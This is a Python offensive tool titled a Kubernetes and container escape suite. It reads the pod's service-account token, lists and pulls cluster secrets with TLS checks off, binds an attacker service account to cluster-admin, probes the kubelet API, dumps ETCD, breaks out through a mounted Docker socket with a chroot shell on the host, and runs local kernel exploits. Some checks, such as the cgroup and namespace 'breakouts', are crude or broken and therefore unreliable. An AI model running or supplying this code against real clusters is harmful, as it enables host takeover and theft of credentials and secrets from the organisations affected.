#!/usr/bin/env python3
"""
Kubernetes and Container Escape Suite
Docker escape, cgroup/namespace bypass, kubelet exploitation,
ETCD extraction, pod-to-host breakout, privilege escalation.
"""

import subprocess
import json
import requests
import os
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from enum import Enum
from datetime import datetime


class EscapeMethod(Enum):
    """Container escape techniques."""
    CGROUP_BREAKOUT = "cgroup_breakout"
    NAMESPACE_BYPASS = "namespace_bypass"
    PRIVILEGED_CONTAINER = "privileged_container"
    DOCKER_SOCKET = "docker_socket_mounted"
    KERNEL_EXPLOIT = "kernel_exploit"
    KUBELET_EXPLOIT = "kubelet_exploit"
    ETCD_EXTRACTION = "etcd_extraction"


@dataclass
class ContainerInfo:
    """Container information."""
    container_id: str
    container_name: str
    image: str
    runtime: str  # docker, containerd, cri-o
    privileged: bool = False
    mounted_docker_socket: bool = False
    mounted_host_path: bool = False
    cpu_quota: int = 0
    memory_limit: int = 0
    capabilities: List[str] = field(default_factory=list)


@dataclass
class KubernetesClusterInfo:
    """Kubernetes cluster information."""
    api_server: str
    version: str
    etcd_endpoint: Optional[str] = None
    kubelet_port: int = 10250
    api_token: Optional[str] = None
    ca_cert: Optional[str] = None
    namespaces: List[str] = field(default_factory=list)
    pods: List[str] = field(default_factory=list)
    secrets: List[Dict] = field(default_factory=list)


@dataclass
class PrivilegeEscalation:
    """Privilege escalation result."""
    method: EscapeMethod
    success: bool
    source_uid: int = 0
    target_uid: int = 0
    target_user: str = ""
    timestamp: str = ""


class DockerEscaper:
    """Docker container escape techniques."""
    
    @staticmethod
    def detect_docker_environment() -> bool:
        """Detect if running in Docker container."""
        return os.path.exists('/.dockerenv')
    
    @staticmethod
    def cgroup_memory_breakout() -> bool:
        """Attempt cgroup memory-based breakout."""
        try:
            # Read cgroup memory info
            with open('/proc/self/cgroup', 'r') as f:
                cgroups = f.read()
            
            # Check for unrestricted cgroup
            if '/docker/' in cgroups or '/lxc/' in cgroups:
                # Attempt to read parent cgroup
                parent_paths = [
                    '/sys/fs/cgroup/memory/../',
                    '/sys/fs/cgroup/cpu/../',
                ]
                
                for path in parent_paths:
                    try:
                        if os.path.exists(path):
                            return True
                    except Exception:
                        pass
            
            return False
        except Exception:
            return False
    
    @staticmethod
    def check_privileged_container() -> bool:
        """Check if container is running as privileged."""
        try:
            # Privileged containers can mount host filesystem
            result = subprocess.run(
                ['mount', '-t', 'tmpfs', 'tmpfs', '/mnt/test'],
                capture_output=True
            )
            
            if result.returncode == 0:
                subprocess.run(['umount', '/mnt/test'], capture_output=True)
                return True
            
            return False
        except Exception:
            return False
    
    @staticmethod
    def check_docker_socket_mounted() -> bool:
        """Check if Docker socket is mounted inside container."""
        return os.path.exists('/var/run/docker.sock')
    
    @staticmethod
    def exploit_docker_socket() -> bool:
        """Exploit mounted Docker socket for container escape."""
        try:
            # Docker socket allows creating new containers with host mount
            cmd = (
                "docker -H unix:///var/run/docker.sock run "
                "-v /:/host -it alpine sh -c 'chroot /host /bin/bash'"
            )
            
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            return result.returncode == 0
        except Exception:
            return False
    
    @staticmethod
    def namespace_breakout() -> Optional[int]:
        """Attempt namespace-based breakout."""
        try:
            # Try to read /proc files outside namespace
            with open('/proc/1/ns/pid', 'r') as f:
                f.read()
            
            # If successful, we're potentially outside container
            return 1  # PID 1 is usually init/systemd on host
        except Exception:
            return None


class KubernetesExploit:
    """Kubernetes cluster exploitation."""
    
    @staticmethod
    def detect_kubernetes_environment() -> bool:
        """Detect if running in Kubernetes pod."""
        return os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/token')
    
    @staticmethod
    def read_service_account_token() -> Optional[str]:
        """Read Kubernetes service account token."""
        try:
            with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
                return f.read().strip()
        except Exception:
            return None
    
    @staticmethod
    def read_service_account_ca() -> Optional[str]:
        """Read Kubernetes CA certificate."""
        try:
            with open('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt', 'r') as f:
                return f.read().strip()
        except Exception:
            return None
    
    @staticmethod
    def read_namespace() -> Optional[str]:
        """Read pod namespace."""
        try:
            with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
                return f.read().strip()
        except Exception:
            return None
    
    @staticmethod
    def enumerate_cluster(api_server: str, token: str) -> KubernetesClusterInfo:
        """Enumerate Kubernetes cluster."""
        cluster = KubernetesClusterInfo(
            api_server=api_server,
            version="unknown",
            api_token=token,
        )
        
        try:
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            
            # Get API version
            response = requests.get(
                f"https://{api_server}:6443/api/v1",
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                cluster.version = response.json().get('apiVersion')
            
            # List namespaces
            response = requests.get(
                f"https://{api_server}:6443/api/v1/namespaces",
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                namespaces = response.json().get('items', [])
                cluster.namespaces = [ns['metadata']['name'] for ns in namespaces]
            
            # List pods in default namespace
            response = requests.get(
                f"https://{api_server}:6443/api/v1/namespaces/default/pods",
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                pods = response.json().get('items', [])
                cluster.pods = [pod['metadata']['name'] for pod in pods]
            
            # List secrets in default namespace
            response = requests.get(
                f"https://{api_server}:6443/api/v1/namespaces/default/secrets",
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                secrets = response.json().get('items', [])
                cluster.secrets = [
                    {
                        "name": secret['metadata']['name'],
                        "type": secret.get('type'),
                    }
                    for secret in secrets
                ]
        except Exception:
            pass
        
        return cluster
    
    @staticmethod
    def extract_secret(
        api_server: str,
        token: str,
        namespace: str,
        secret_name: str,
    ) -> Optional[Dict]:
        """Extract Kubernetes secret."""
        try:
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            
            response = requests.get(
                f"https://{api_server}:6443/api/v1/namespaces/{namespace}/secrets/{secret_name}",
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                return response.json().get('data', {})
            return None
        except Exception:
            return None
    
    @staticmethod
    def escalate_to_cluster_admin(
        api_server: str,
        token: str,
        attacker_sa: str,
    ) -> bool:
        """Escalate service account to cluster admin."""
        try:
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            
            # Create ClusterRoleBinding
            binding = {
                "apiVersion": "rbac.authorization.k8s.io/v1",
                "kind": "ClusterRoleBinding",
                "metadata": {"name": "admin-binding"},
                "roleRef": {
                    "apiGroup": "rbac.authorization.k8s.io",
                    "kind": "ClusterRole",
                    "name": "cluster-admin"
                },
                "subjects": [
                    {
                        "kind": "ServiceAccount",
                        "name": attacker_sa,
                        "namespace": "default"
                    }
                ]
            }
            
            response = requests.post(
                f"https://{api_server}:6443/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
                headers=headers,
                json=binding,
                verify=False
            )
            
            return response.status_code in [200, 201]
        except Exception:
            return False
    
    @staticmethod
    def exploit_kubelet(kubelet_host: str, kubelet_port: int = 10250) -> bool:
        """Exploit kubelet API (unauthenticated)."""
        try:
            # Kubelet API allows pod exec
            response = requests.get(
                f"https://{kubelet_host}:{kubelet_port}/api/v1/pods",
                verify=False
            )
            
            # If successful, kubelet is exposed
            return response.status_code == 200
        except Exception:
            return False
    
    @staticmethod
    def extract_etcd(etcd_endpoint: str) -> Optional[Dict]:
        """Extract all data from ETCD."""
        try:
            # ETCD v3 API
            response = requests.get(
                f"http://{etcd_endpoint}:2379/v3/kv/range",
                json={"key": "YQ=="},  # base64("a")
            )
            
            if response.status_code == 200:
                return response.json()
            return None
        except Exception:
            return None


class PrivilegeEscalationEngine:
    """Privilege escalation techniques."""
    
    @staticmethod
    def find_suid_binaries() -> List[str]:
        """Find SUID binaries that could be exploited."""
        try:
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            return result.stdout.split('\n')
        except Exception:
            return []
    
    @staticmethod
    def check_kernel_version() -> Optional[str]:
        """Get kernel version for exploit matching."""
        try:
            result = subprocess.run(['uname', '-r'], capture_output=True, text=True)
            return result.stdout.strip()
        except Exception:
            return None
    
    @staticmethod
    def exploit_kernel(kernel_version: str, exploit_path: str) -> bool:
        """Run local kernel exploit."""
        try:
            result = subprocess.run(
                [exploit_path],
                capture_output=True,
                timeout=30
            )
            
            return result.returncode == 0
        except Exception:
            return False
    
    @staticmethod
    def check_sudo_access() -> bool:
        """Check if current user has sudo access."""
        try:
            result = subprocess.run(
                ['sudo', '-l'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            return 'ALL' in result.stdout or len(result.stdout) > 0
        except Exception:
            return False


class ContainerEscapeOrchestrator:
    """Main orchestrator for container escape."""
    
    def __init__(self):
        self.escape_results: List[PrivilegeEscalation] = []
        self.cluster_info: Optional[KubernetesClusterInfo] = None
    
    def assess_escape_vectors(self) -> Dict:
        """Assess all available escape vectors."""
        results = {
            "is_docker": DockerEscaper.detect_docker_environment(),
            "is_kubernetes": KubernetesExploit.detect_kubernetes_environment(),
            "privileged_container": DockerEscaper.check_privileged_container(),
            "docker_socket_mounted": DockerEscaper.check_docker_socket_mounted(),
            "cgroup_exploitable": DockerEscaper.cgroup_memory_breakout(),
            "kernel_version": PrivilegeEscalationEngine.check_kernel_version(),
            "suid_binaries": PrivilegeEscalationEngine.find_suid_binaries()[:5],
        }
        
        return results
    
    def exploit_kubernetes(self) -> Optional[KubernetesClusterInfo]:
        """Attempt Kubernetes compromise."""
        token = KubernetesExploit.read_service_account_token()
        namespace = KubernetesExploit.read_namespace()
        
        if not token:
            return None
        
        # Assume API server is at kubernetes.default.svc
        api_server = "kubernetes.default.svc"
        
        cluster = KubernetesExploit.enumerate_cluster(api_server, token)
        self.cluster_info = cluster
        
        return cluster
    
    def export_results_json(self) -> str:
        """Export results as JSON."""
        data = {
            "escape_results": [asdict(r) for r in self.escape_results],
            "cluster_info": asdict(self.cluster_info) if self.cluster_info else None,
        }
        
        return json.dumps(data, indent=2, default=str)


def main():
    """Demo: container escape."""
    
    orchestrator = ContainerEscapeOrchestrator()
    
    # Assess escape vectors
    vectors = orchestrator.assess_escape_vectors()
    
    print("[+] Container Escape Assessment")
    print(f"    Docker: {vectors['is_docker']}")
    print(f"    Kubernetes: {vectors['is_kubernetes']}")
    print(f"    Privileged: {vectors['privileged_container']}")
    print(f"    Docker socket: {vectors['docker_socket_mounted']}")
    print(f"    Cgroup exploitable: {vectors['cgroup_exploitable']}")
    print(f"    Kernel: {vectors['kernel_version']}")
    
    # Try Kubernetes
    if vectors['is_kubernetes']:
        print("\n[+] Kubernetes pod detected, enumerating cluster...")
        cluster = orchestrator.exploit_kubernetes()
        if cluster:
            print(f"    Cluster: {cluster.api_server}")
            print(f"    Namespaces: {', '.join(cluster.namespaces)}")
            print(f"    Secrets: {len(cluster.secrets)}")


if __name__ == '__main__':
    main()
